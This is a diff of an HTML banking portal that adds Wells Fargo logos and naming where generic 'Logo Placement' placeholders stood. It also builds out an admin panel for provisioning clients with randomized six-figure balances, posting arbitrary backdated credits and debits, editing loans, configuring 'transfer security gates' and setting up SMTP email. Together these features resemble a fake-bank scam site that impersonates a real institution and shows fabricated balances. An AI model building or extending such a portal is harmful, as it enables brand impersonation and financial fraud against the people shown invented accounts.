@@ -9,6 +9,8 @@
   <meta property="og:description" content="Executive banking and treasury portal with multi-currency liquidity tracking, cash flow analytics, card controls, and dual-gate external transfers." />
   <meta property="og:type" content="website" />
   <meta name="twitter:card" content="summary_large_image" />
+  <link rel="icon" type="image/png" href="/assets/aistudio/Logo_40ef7a99.png" />
+  <link rel="preload" as="image" href="/assets/aistudio/Logo_40ef7a99.png" />
 
   <!-- Google Fonts: Plus Jakarta Sans, Inter & JetBrains Mono -->
   <link rel="preconnect" href="https://fonts.googleapis.com" />
@@ -135,12 +137,12 @@
     <!-- Top Crimson Header Bar with 3px Gold Accent Line -->
     <header class="bg-[#C8102E] text-white border-b-[3px] border-[#F59E0B] md:sticky md:top-0 z-30 shadow-sm">
       <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-4 sm:gap-8">
-        <!-- Logo Placement Zone -->
-        <a href="#top" class="flex items-center whitespace-nowrap shrink-0 rounded-lg py-1" aria-label="Home">
+        <!-- Brand Logo -->
+        <a href="#top" class="flex items-center whitespace-nowrap shrink-0 rounded-lg py-1" aria-label="Wells Fargo Home">
           <div class="flex items-center">
-            <img src="./logo.png" alt="Logo" class="h-10 w-auto object-contain" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
-            <div style="display:none;" class="px-3.5 py-2 rounded-lg border border-dashed border-white/75 bg-white/10 text-white text-xs font-bold uppercase tracking-wider">
-              Wellsfargo
+            <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="41" height="44" fetchpriority="high" decoding="async" class="h-11 w-[41px] rounded-md object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E]" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
+            <div style="display:none;" class="px-3 py-1.5 rounded-md border border-white/40 bg-[#8B0015] text-white font-display text-xs font-extrabold uppercase tracking-wider">
+              WELLS FARGO
             </div>
           </div>
         </a>
@@ -343,8 +345,9 @@
     <!-- Quiet Institutional Footer -->
     <footer class="bg-slate-950 text-slate-300 border-t border-slate-800 py-8">
       <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs">
-        <div class="text-slate-400">
-          Private Wealth &amp; Executive Treasury Portal &middot; SWIFT <span class="font-mono text-slate-300">MRDNUS33XXX</span>
+        <div class="flex items-center gap-3 text-slate-400">
+          <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="30" height="32" loading="lazy" decoding="async" class="h-8 w-[30px] rounded object-contain shadow-sm ring-1 ring-white/15 bg-[#C8102E] shrink-0" />
+          <span>Private Wealth &amp; Executive Treasury Portal &middot; SWIFT <span class="font-mono text-slate-300">MRDNUS33XXX</span></span>
         </div>
         <button
           type="button"
@@ -364,11 +367,11 @@
     <!-- Top Crimson Header Bar with 3px Gold Accent Border -->
     <header class="bg-[#C8102E] text-white border-b-[3px] border-[#F59E0B] md:sticky md:top-0 z-30 shadow-sm">
       <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 min-h-16 py-2.5 md:py-0 flex flex-wrap items-center justify-between gap-2.5 sm:gap-6">
-        <!-- Logo Placement -->
+        <!-- Brand Logo -->
         <div class="flex items-center shrink-0">
-          <img src="./logo.png" alt="Logo" class="h-9 sm:h-10 w-auto object-contain" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
-          <div style="display:none;" class="px-3 py-1.5 sm:px-3.5 sm:py-2 rounded-lg border border-dashed border-white/75 bg-white/10 text-white text-[11px] sm:text-xs font-bold uppercase tracking-wider">
-            Logo Placement
+          <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="41" height="44" fetchpriority="high" decoding="async" class="h-10 sm:h-11 w-auto rounded-md object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E]" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
+          <div style="display:none;" class="px-3 py-1.5 rounded-md border border-white/40 bg-[#8B0015] text-white font-display text-xs font-extrabold uppercase tracking-wider">
+            WELLS FARGO
           </div>
         </div>
 
@@ -458,6 +461,14 @@
             <div class="text-[11px] font-medium text-slate-500">Account Tier</div>
             <div class="text-xs font-semibold text-[#C8102E]" id="clientTierLabel">Private Wealth Checking</div>
           </div>
+          <button
+            type="button"
+            id="openClientProfileBtn"
+            class="ml-0 sm:ml-2 px-3.5 py-2 rounded-full border border-slate-300 hover:border-[#C8102E] hover:bg-[#FEF2F2] text-xs font-semibold text-slate-700 hover:text-[#C8102E] transition-colors inline-flex items-center gap-1.5 whitespace-nowrap shrink-0"
+          >
+            <i data-lucide="user-cog" class="w-3.5 h-3.5"></i>
+            <span>Profile &amp; Settings</span>
+          </button>
         </div>
       </section>
 
@@ -547,7 +558,7 @@
         <div class="bg-white border border-slate-200 rounded-2xl p-5 shadow-sm">
           <div class="flex items-center justify-between gap-2">
             <span class="text-xs font-medium text-slate-500">Investment Portfolio</span>
-            <span class="text-xs font-semibold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded-md whitespace-nowrap shrink-0">+14.2% YTD</span>
+            <span id="kpiInvestmentYtdBadge" class="text-xs font-semibold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded-md whitespace-nowrap shrink-0">+14.2% YTD</span>
           </div>
           <div class="font-display text-2xl font-bold text-slate-900 tabular-nums mt-3" id="kpiInvestmentPortfolio">
             $12,500,000.00
@@ -558,12 +569,12 @@
         <div class="bg-white border border-slate-200 rounded-2xl p-5 shadow-sm">
           <div class="flex items-center justify-between gap-2">
             <span class="text-xs font-medium text-slate-500">Active Loan Balance</span>
-            <span class="text-xs font-semibold text-amber-800 bg-amber-50 px-2 py-0.5 rounded-md whitespace-nowrap shrink-0">3.85% APR</span>
+            <span id="kpiLoanAprBadge" class="text-xs font-semibold text-amber-800 bg-amber-50 px-2 py-0.5 rounded-md whitespace-nowrap shrink-0">3.85% APR</span>
           </div>
           <div class="font-display text-2xl font-bold text-slate-900 tabular-nums mt-3" id="kpiLoanBalance">
             $1,200,000.00
           </div>
-          <p class="text-xs text-slate-500 mt-1.5">Executive revolving credit facility</p>
+          <p id="kpiLoanMetaText" class="text-xs text-slate-500 mt-1.5">Next payment: 2026-12-01</p>
         </div>
       </section>
 
@@ -686,12 +697,12 @@
               <p class="text-xs text-slate-300 mt-1">All card transactions are paused until unfrozen.</p>
             </div>
 
-            <!-- Card Top Row: Logo Placement & Contactless -->
+            <!-- Card Top Row: Brand Logo & Contactless -->
             <div class="relative flex items-center justify-between gap-3">
               <div class="flex items-center">
-                <img src="./logo.png" alt="Logo" class="h-7 w-auto object-contain" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
-                <div style="display:none;" class="px-2.5 py-1 rounded border border-dashed border-white/70 bg-white/10 text-white text-[10px] font-bold uppercase tracking-wider">
-                  Logo Placement
+                <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="34" height="36" loading="lazy" decoding="async" class="h-9 w-[34px] rounded object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E]" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
+                <div style="display:none;" class="px-2.5 py-1 rounded border border-white/40 bg-white/10 text-white text-[10px] font-bold uppercase tracking-wider">
+                  WELLS FARGO
                 </div>
               </div>
               <svg class="w-6 h-6 text-white/80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-label="Contactless enabled">
@@ -924,12 +935,12 @@
   <div id="adminView" class="hidden min-h-screen flex flex-col bg-[#F9FAFB]">
     <!-- Admin Header Bar -->
     <header class="bg-[#C8102E] text-white border-b-[3px] border-[#F59E0B] md:sticky md:top-0 z-30 shadow-sm">
-      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-4">
+      <div class="max-w-[1380px] mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-4">
         <div class="flex items-center gap-4 min-w-0">
           <div class="flex items-center shrink-0">
-            <img src="./logo.png" alt="Logo" class="h-10 w-auto object-contain" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
-            <div style="display:none;" class="px-3.5 py-2 rounded-lg border border-dashed border-white/75 bg-white/10 text-white text-xs font-bold uppercase tracking-wider">
-              Logo Placement
+            <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="41" height="44" fetchpriority="high" decoding="async" class="h-10 sm:h-11 w-auto rounded-md object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E]" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
+            <div style="display:none;" class="px-3 py-1.5 rounded-md border border-white/40 bg-[#8B0015] text-white font-display text-xs font-extrabold uppercase tracking-wider">
+              WELLS FARGO
             </div>
           </div>
           <span class="hidden sm:inline-block text-sm font-semibold text-amber-200 whitespace-nowrap shrink-0">Master Admin Command Center</span>
@@ -955,7 +966,7 @@
       </div>
     </header>
 
-    <main class="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-7 space-y-6 pb-16">
+    <main class="flex-1 max-w-[1380px] w-full mx-auto px-4 sm:px-6 lg:px-8 py-7 space-y-6 pb-16">
       <!-- Executive KPI Strip -->
       <section class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
         <div class="bg-white border border-slate-200 rounded-2xl p-5 shadow-sm">
@@ -980,131 +991,490 @@
         </div>
       </section>
 
-      <!-- Create New Client Form -->
-      <section class="bg-white border border-slate-200 rounded-2xl p-5 sm:p-6 shadow-sm">
-        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-5 border-b border-slate-200">
-          <div>
-            <h2 class="font-display text-lg font-bold text-slate-900">Provision New Client Portfolio</h2>
-            <p class="text-xs text-slate-500">Minimum starting liquidity is $650,000.00 USD with automated account, card, and ledger provisioning.</p>
-          </div>
-        </div>
-
-        <form id="createClientForm" class="pt-5 space-y-5" novalidate>
-          <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-            <div>
-              <label for="newClientFullName" class="block text-xs font-semibold text-slate-700 mb-1">Full Name *</label>
-              <input type="text" id="newClientFullName" required placeholder="e.g. Victoria Sterling" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
-            </div>
-
-            <div>
-              <label for="newClientUsername" class="block text-xs font-semibold text-slate-700 mb-1">Username *</label>
-              <input type="text" id="newClientUsername" required placeholder="e.g. victoria.sterling" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono" />
-            </div>
-
-            <div>
-              <div class="flex items-center justify-between mb-1">
-                <label for="newClientPassword" class="text-xs font-semibold text-slate-700">Password *</label>
-                <button type="button" id="generatePassBtn" class="text-xs font-semibold text-[#C8102E] hover:underline">Generate Strong Password</button>
-              </div>
-              <div class="relative">
-                <input type="password" id="newClientPassword" required placeholder="Strong password" class="w-full rounded-xl border border-slate-300 pl-3.5 pr-16 py-2.5 text-sm font-mono" />
-                <button type="button" id="toggleNewClientPassBtn" class="absolute right-2.5 top-1/2 -translate-y-1/2 text-xs font-semibold text-slate-500 hover:text-slate-900 px-2 py-1">Show</button>
-              </div>
-            </div>
-
-            <div>
-              <label for="newClientEmail" class="block text-xs font-semibold text-slate-700 mb-1">Email Address *</label>
-              <input type="email" id="newClientEmail" required placeholder="client@privatewealth.com" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
-            </div>
-
-            <div>
-              <label for="newClientPhone" class="block text-xs font-semibold text-slate-700 mb-1">Phone Number *</label>
-              <input type="text" id="newClientPhone" required placeholder="+1 (212) 555-0142" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
-            </div>
-
-            <div>
-              <label for="newClientAddress" class="block text-xs font-semibold text-slate-700 mb-1">Residential / Office Address *</label>
-              <input type="text" id="newClientAddress" required placeholder="1200 Madison Ave, New York, NY" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
-            </div>
-
-            <div>
-              <label for="newClientTier" class="block text-xs font-semibold text-slate-700 mb-1">Account Tier *</label>
-              <select id="newClientTier" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm bg-white">
-                <option value="Private Wealth Checking">Private Wealth Checking</option>
-                <option value="Corporate Treasury">Corporate Treasury</option>
-                <option value="Global Reserve">Global Reserve</option>
-              </select>
-            </div>
-
-            <div>
-              <div class="flex items-center justify-between gap-2 mb-1">
-                <label for="newClientBalance" class="text-xs font-semibold text-slate-700">Starting Balance (USD) *</label>
-                <button type="button" id="randomizeBalanceBtn" class="text-xs font-semibold text-[#C8102E] hover:underline whitespace-nowrap shrink-0">Randomize ($650k+)</button>
-              </div>
-              <input type="number" id="newClientBalance" min="650000" step="0.01" value="1250000" required class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono tabular-nums" />
-            </div>
-
-            <div>
-              <label for="newClientPhotoInput" class="block text-xs font-semibold text-slate-700 mb-1">Profile Photo (Optional, Compressed)</label>
-              <div class="flex items-center gap-3">
-                <img id="newClientAvatarThumb" src="" alt="" class="hidden w-10 h-10 rounded-full object-cover border border-slate-300 shrink-0" />
-                <input type="file" id="newClientPhotoInput" accept="image/*" class="block w-full text-xs text-slate-600 file:mr-3 file:py-2 file:px-3.5 file:rounded-full file:border-0 file:text-xs file:font-semibold file:bg-[#FEF2F2] file:text-[#C8102E] hover:file:bg-red-100 cursor-pointer" />
-              </div>
-            </div>
-          </div>
-
-          <div id="createClientError" class="hidden rounded-xl border border-red-200 bg-[#FEF2F2] px-4 py-3 text-xs font-medium text-[#8B0015]"></div>
-
-          <div class="flex justify-end">
-            <button
-              type="submit"
-              class="bg-[#C8102E] hover:bg-[#8B0015] text-white font-semibold text-sm px-6 py-3 rounded-full shadow-sm transition-colors inline-flex items-center gap-2 whitespace-nowrap"
-            >
-              <i data-lucide="user-plus" class="w-4 h-4"></i>
-              <span>Provision Client Account</span>
+      <!-- Responsive 6-Tab Master Admin Shell (Left Sidebar on Desktop / Horizontal Tab Bar on Mobile) -->
+      <div class="flex flex-col lg:flex-row gap-5 items-start">
+        <aside class="w-full lg:w-56 shrink-0 bg-white border border-slate-200 rounded-2xl p-2 shadow-sm lg:sticky lg:top-24" aria-label="Master Admin Navigation">
+          <div class="hidden lg:block px-3 pt-2 pb-2.5 text-[11px] font-bold uppercase tracking-wider text-slate-400">Command Center</div>
+          <nav class="flex lg:flex-col gap-1.5 overflow-x-auto pb-1 lg:pb-0" role="tablist">
+            <button type="button" role="tab" data-admin-tab="clients" class="admin-nav-btn flex items-center gap-2.5 px-3.5 py-2.5 rounded-xl text-xs sm:text-sm font-semibold whitespace-nowrap transition-colors text-left">
+              <i data-lucide="users" class="w-4 h-4 shrink-0"></i>
+              <span>Clients Directory</span>
             </button>
-          </div>
-        </form>
-      </section>
+            <button type="button" role="tab" data-admin-tab="ledger" class="admin-nav-btn flex items-center gap-2.5 px-3.5 py-2.5 rounded-xl text-xs sm:text-sm font-semibold whitespace-nowrap transition-colors text-left">
+              <i data-lucide="arrow-left-right" class="w-4 h-4 shrink-0"></i>
+              <span>Credit &amp; Debit Ledger</span>
+            </button>
+            <button type="button" role="tab" data-admin-tab="loans" class="admin-nav-btn flex items-center gap-2.5 px-3.5 py-2.5 rounded-xl text-xs sm:text-sm font-semibold whitespace-nowrap transition-colors text-left">
+              <i data-lucide="trending-up" class="w-4 h-4 shrink-0"></i>
+              <span>Loans &amp; Investments</span>
+            </button>
+            <button type="button" role="tab" data-admin-tab="gates" class="admin-nav-btn flex items-center gap-2.5 px-3.5 py-2.5 rounded-xl text-xs sm:text-sm font-semibold whitespace-nowrap transition-colors text-left">
+              <i data-lucide="shield-check" class="w-4 h-4 shrink-0"></i>
+              <span>Transfer Security Gates</span>
+            </button>
+            <button type="button" role="tab" data-admin-tab="smtp" class="admin-nav-btn flex items-center gap-2.5 px-3.5 py-2.5 rounded-xl text-xs sm:text-sm font-semibold whitespace-nowrap transition-colors text-left">
+              <i data-lucide="mail" class="w-4 h-4 shrink-0"></i>
+              <span>Email SMTP Settings</span>
+            </button>
+            <button type="button" role="tab" data-admin-tab="security" class="admin-nav-btn flex items-center gap-2.5 px-3.5 py-2.5 rounded-xl text-xs sm:text-sm font-semibold whitespace-nowrap transition-colors text-left">
+              <i data-lucide="key-round" class="w-4 h-4 shrink-0"></i>
+              <span>Admin Security</span>
+            </button>
+          </nav>
+        </aside>
 
-      <!-- Searchable Client Directory Table -->
-      <section class="bg-white border border-slate-200 rounded-2xl shadow-sm overflow-hidden">
-        <div class="p-5 sm:p-6 border-b border-slate-200 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
-          <div>
-            <h2 class="font-display text-lg font-bold text-slate-900">Client Directory</h2>
-            <p class="text-xs text-slate-500">Manage balances, inspect client views, and audit credentials</p>
+        <div class="flex-1 min-w-0 w-full space-y-6">
+          <!-- TAB 1: CLIENTS DIRECTORY -->
+          <div id="adminTabClients" class="admin-tab-panel space-y-6">
+            <section class="bg-white border border-slate-200 rounded-2xl p-5 sm:p-6 shadow-sm">
+              <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-5 border-b border-slate-200">
+                <div>
+                  <h2 class="font-display text-lg font-bold text-slate-900">Provision New Client Portfolio</h2>
+                  <p class="text-xs text-slate-500">Minimum starting liquidity is $650,000.00 USD with automated account, card, and ledger provisioning.</p>
+                </div>
+              </div>
+
+              <form id="createClientForm" class="pt-5 space-y-5" novalidate>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  <div>
+                    <label for="newClientFullName" class="block text-xs font-semibold text-slate-700 mb-1">Full Name *</label>
+                    <input type="text" id="newClientFullName" required placeholder="e.g. Victoria Sterling" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
+                  </div>
+
+                  <div>
+                    <label for="newClientUsername" class="block text-xs font-semibold text-slate-700 mb-1">Username *</label>
+                    <input type="text" id="newClientUsername" required placeholder="e.g. victoria.sterling" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono" />
+                  </div>
+
+                  <div>
+                    <div class="flex items-center justify-between mb-1">
+                      <label for="newClientPassword" class="text-xs font-semibold text-slate-700">Password *</label>
+                      <button type="button" id="generatePassBtn" class="text-xs font-semibold text-[#C8102E] hover:underline">Generate Strong Password</button>
+                    </div>
+                    <div class="relative">
+                      <input type="password" id="newClientPassword" required placeholder="Strong password" class="w-full rounded-xl border border-slate-300 pl-3.5 pr-16 py-2.5 text-sm font-mono" />
+                      <button type="button" id="toggleNewClientPassBtn" class="absolute right-2.5 top-1/2 -translate-y-1/2 text-xs font-semibold text-slate-500 hover:text-slate-900 px-2 py-1">Show</button>
+                    </div>
+                  </div>
+
+                  <div>
+                    <label for="newClientEmail" class="block text-xs font-semibold text-slate-700 mb-1">Email Address *</label>
+                    <input type="email" id="newClientEmail" required placeholder="client@privatewealth.com" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
+                  </div>
+
+                  <div>
+                    <label for="newClientPhone" class="block text-xs font-semibold text-slate-700 mb-1">Phone Number *</label>
+                    <input type="text" id="newClientPhone" required placeholder="+1 (212) 555-0142" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
+                  </div>
+
+                  <div>
+                    <label for="newClientAddress" class="block text-xs font-semibold text-slate-700 mb-1">Residential / Office Address *</label>
+                    <input type="text" id="newClientAddress" required placeholder="1200 Madison Ave, New York, NY" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
+                  </div>
+
+                  <div>
+                    <label for="newClientTier" class="block text-xs font-semibold text-slate-700 mb-1">Account Tier *</label>
+                    <select id="newClientTier" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm bg-white">
+                      <option value="Private Wealth Checking">Private Wealth Checking</option>
+                      <option value="Corporate Treasury">Corporate Treasury</option>
+                      <option value="Global Reserve">Global Reserve</option>
+                    </select>
+                  </div>
+
+                  <div>
+                    <div class="flex items-center justify-between gap-2 mb-1">
+                      <label for="newClientBalance" class="text-xs font-semibold text-slate-700">Starting Balance (USD) *</label>
+                      <button type="button" id="randomizeBalanceBtn" class="text-xs font-semibold text-[#C8102E] hover:underline whitespace-nowrap shrink-0">Randomize ($650k+)</button>
+                    </div>
+                    <input type="number" id="newClientBalance" min="650000" step="0.01" value="1250000" required class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono tabular-nums" />
+                  </div>
+
+                  <div>
+                    <label for="newClientPhotoInput" class="block text-xs font-semibold text-slate-700 mb-1">Profile Photo (Optional, Compressed)</label>
+                    <div class="flex items-center gap-3">
+                      <img id="newClientAvatarThumb" src="" alt="" class="hidden w-10 h-10 rounded-full object-cover border border-slate-300 shrink-0" />
+                      <input type="file" id="newClientPhotoInput" accept="image/*" class="block w-full text-xs text-slate-600 file:mr-3 file:py-2 file:px-3.5 file:rounded-full file:border-0 file:text-xs file:font-semibold file:bg-[#FEF2F2] file:text-[#C8102E] hover:file:bg-red-100 cursor-pointer" />
+                    </div>
+                  </div>
+                </div>
+
+                <div id="createClientError" class="hidden rounded-xl border border-red-200 bg-[#FEF2F2] px-4 py-3 text-xs font-medium text-[#8B0015]"></div>
+
+                <div class="flex justify-end">
+                  <button
+                    type="submit"
+                    class="bg-[#C8102E] hover:bg-[#8B0015] text-white font-semibold text-sm px-6 py-3 rounded-full shadow-sm transition-colors inline-flex items-center gap-2 whitespace-nowrap"
+                  >
+                    <i data-lucide="user-plus" class="w-4 h-4"></i>
+                    <span>Provision Client Account</span>
+                  </button>
+                </div>
+              </form>
+            </section>
+
+            <section class="bg-white border border-slate-200 rounded-2xl shadow-sm overflow-hidden">
+              <div class="p-5 sm:p-6 border-b border-slate-200 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+                <div>
+                  <h2 class="font-display text-lg font-bold text-slate-900">Client Directory</h2>
+                  <p class="text-xs text-slate-500">Manage balances, inspect client views, and audit credentials</p>
+                </div>
+                <div class="relative w-full sm:w-72">
+                  <i data-lucide="search" class="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none"></i>
+                  <input
+                    type="search"
+                    id="adminClientSearchInput"
+                    placeholder="Search name, username, email..."
+                    class="w-full rounded-full border border-slate-300 pl-9 pr-4 py-2 text-xs sm:text-sm text-slate-800"
+                  />
+                </div>
+              </div>
+
+              <div class="overflow-x-auto">
+                <table class="w-full text-left border-collapse">
+                  <thead>
+                    <tr class="bg-slate-50 border-b border-slate-200 text-[11px] font-semibold uppercase tracking-wider text-slate-500">
+                      <th class="py-3 pl-4 pr-2.5">Client</th>
+                      <th class="py-3 px-2.5">Credentials</th>
+                      <th class="py-3 px-2.5">Contact</th>
+                      <th class="py-3 px-2.5">Tier &amp; Card</th>
+                      <th class="py-3 px-2.5 text-right">USD Balance</th>
+                      <th class="py-3 pl-2.5 pr-4 text-right">Actions</th>
+                    </tr>
+                  </thead>
+                  <tbody id="adminDirectoryBody" class="divide-y divide-slate-100"></tbody>
+                </table>
+              </div>
+
+              <div id="adminDirectoryEmpty" class="hidden py-10 px-6 text-center text-sm text-slate-500">
+                No client accounts match your directory search.
+              </div>
+            </section>
           </div>
-          <div class="relative w-full sm:w-72">
-            <i data-lucide="search" class="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none"></i>
-            <input
-              type="search"
-              id="adminClientSearchInput"
-              placeholder="Search name, username, email..."
-              class="w-full rounded-full border border-slate-300 pl-9 pr-4 py-2 text-xs sm:text-sm text-slate-800"
-            />
+
+          <!-- TAB 2: CREDIT & DEBIT LEDGER MANAGER -->
+          <div id="adminTabLedger" class="admin-tab-panel hidden space-y-6">
+            <section class="bg-white border border-slate-200 rounded-2xl p-5 sm:p-6 shadow-sm space-y-5">
+              <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-slate-200">
+                <div>
+                  <h2 class="font-display text-lg font-bold text-slate-900">Credit &amp; Debit Ledger Manager</h2>
+                  <p class="text-xs text-slate-500">Post direct credits or debits to any client portfolio and synchronize transaction history across devices.</p>
+                </div>
+                <div class="rounded-xl bg-[#FAF8F6] border border-stone-200 px-3.5 py-2 text-xs shrink-0">
+                  <span class="text-slate-500">Selected Balance:</span>
+                  <span id="ledgerAdminBalanceSummary" class="font-mono font-bold text-[#C8102E] ml-1 tabular-nums">$0.00</span>
+                </div>
+              </div>
+
+              <form id="adminLedgerForm" class="space-y-4" novalidate>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  <div>
+                    <label for="ledgerAdminClientSelect" class="block text-xs font-semibold text-slate-700 mb-1">Target Client *</label>
+                    <select id="ledgerAdminClientSelect" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm bg-white"></select>
+                  </div>
+
+                  <div>
+                    <label for="ledgerAdminTypeSelect" class="block text-xs font-semibold text-slate-700 mb-1">Entry Type *</label>
+                    <select id="ledgerAdminTypeSelect" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm bg-white">
+                      <option value="credit">Credit (Deposit +)</option>
+                      <option value="debit">Debit (Withdrawal -)</option>
+                    </select>
+                  </div>
+
+                  <div>
+                    <label for="ledgerAdminAmountInput" class="block text-xs font-semibold text-slate-700 mb-1">Amount (USD) *</label>
+                    <input type="number" id="ledgerAdminAmountInput" min="0.01" step="0.01" required placeholder="250000.00" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono tabular-nums" />
+                  </div>
+
+                  <div>
+                    <label for="ledgerAdminDescInput" class="block text-xs font-semibold text-slate-700 mb-1">Transaction Description *</label>
+                    <input type="text" id="ledgerAdminDescInput" required placeholder="e.g. Q4 Institutional Capital Sweep" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
+                  </div>
+
+                  <div>
+                    <label for="ledgerAdminCategorySelect" class="block text-xs font-semibold text-slate-700 mb-1">Category / Clearing Rail *</label>
+                    <select id="ledgerAdminCategorySelect" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm bg-white">
+                      <option value="Wire Transfer">Wire Transfer</option>
+                      <option value="ACH Transfer">ACH Transfer</option>
+                      <option value="Direct Deposit">Direct Deposit</option>
+                      <option value="Treasury Yield">Treasury Yield</option>
+                      <option value="Custody Fee">Custody Fee</option>
+                    </select>
+                  </div>
+
+                  <div>
+                    <label for="ledgerAdminDateInput" class="block text-xs font-semibold text-slate-700 mb-1">Effective Date *</label>
+                    <input type="date" id="ledgerAdminDateInput" required class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono" />
+                  </div>
+                </div>
+
+                <div id="adminLedgerError" class="hidden rounded-xl border border-red-200 bg-[#FEF2F2] px-4 py-3 text-xs font-medium text-[#8B0015]"></div>
+
+                <div class="flex justify-end">
+                  <button type="submit" class="bg-[#C8102E] hover:bg-[#8B0015] text-white font-semibold text-sm px-6 py-2.5 rounded-full shadow-sm transition-colors inline-flex items-center gap-2">
+                    <i data-lucide="check-circle-2" class="w-4 h-4"></i>
+                    <span>Post Ledger Entry</span>
+                  </button>
+                </div>
+              </form>
+            </section>
+
+            <section class="bg-white border border-slate-200 rounded-2xl shadow-sm overflow-hidden">
+              <div class="p-5 border-b border-slate-200">
+                <h3 class="font-display text-base font-bold text-slate-900">Selected Client Recent Ledger</h3>
+                <p class="text-xs text-slate-500">Most recent postings reflected on the client portal</p>
+              </div>
+              <div class="overflow-x-auto">
+                <table class="w-full text-left border-collapse">
+                  <thead>
+                    <tr class="bg-slate-50 border-b border-slate-200 text-[11px] font-semibold uppercase tracking-wider text-slate-500">
+                      <th class="py-3 px-5">Date</th>
+                      <th class="py-3 px-4">Reference</th>
+                      <th class="py-3 px-4">Description</th>
+                      <th class="py-3 px-4">Category</th>
+                      <th class="py-3 px-5 text-right">Amount</th>
+                    </tr>
+                  </thead>
+                  <tbody id="adminSelectedClientTxBody" class="divide-y divide-slate-100"></tbody>
+                </table>
+              </div>
+            </section>
+          </div>
+
+          <!-- TAB 3: LOANS & INVESTMENTS MANAGER -->
+          <div id="adminTabLoans" class="admin-tab-panel hidden space-y-6">
+            <section class="bg-white border border-slate-200 rounded-2xl p-5 sm:p-6 shadow-sm space-y-5">
+              <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-slate-200">
+                <div>
+                  <h2 class="font-display text-lg font-bold text-slate-900">Loans &amp; Investments Manager</h2>
+                  <p class="text-xs text-slate-500">Modify credit facility balances, APR rates, payment schedules, and custodial investment allocations.</p>
+                </div>
+                <div class="w-full sm:w-64">
+                  <label for="loansAdminClientSelect" class="sr-only">Select Client</label>
+                  <select id="loansAdminClientSelect" class="w-full rounded-xl border border-slate-300 px-3.5 py-2 text-sm bg-white font-semibold"></select>
+                </div>
+              </div>
+
+              <!-- Quick Facility Actions -->
+              <div class="rounded-2xl bg-[#FAF8F6] border border-stone-200 p-4 space-y-3">
+                <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
+                  <div>
+                    <div class="text-xs font-bold text-slate-900">Quick Capital Actions</div>
+                    <div class="text-[11px] text-slate-500">Enter an amount (USD) to issue a loan, record a repayment, or allocate investment funds immediately.</div>
+                  </div>
+                  <input type="number" id="loansQuickAmountInput" min="1" step="0.01" placeholder="Amount e.g. 500000" class="w-full sm:w-52 rounded-xl border border-slate-300 bg-white px-3.5 py-2 text-sm font-mono tabular-nums" />
+                </div>
+                <div class="flex flex-wrap gap-2">
